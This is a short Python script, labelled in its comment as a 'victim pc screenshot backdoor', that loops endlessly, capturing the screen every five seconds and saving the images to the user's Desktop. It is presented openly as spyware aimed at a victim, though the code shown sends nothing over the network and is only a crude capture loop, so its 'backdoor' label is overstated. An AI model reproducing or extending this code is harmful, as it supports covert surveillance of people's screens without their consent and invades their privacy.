# capturing victim pc screenshot backdoor
import pyscreenshot as Img
import getpass
from random import randint
import time
def main():
	while True:
	     img =Img.grab()
	     path="C:/Users/"+str(getpass.getuser())+"/Desktop/"#choose the path
	     savefile=path+str(randint(1,100))+".jpg"#saving the image
	     img.save(savefile)
	     time.sleep(5)#making 5sec delay 


if __name__ == "__main__":
	main()
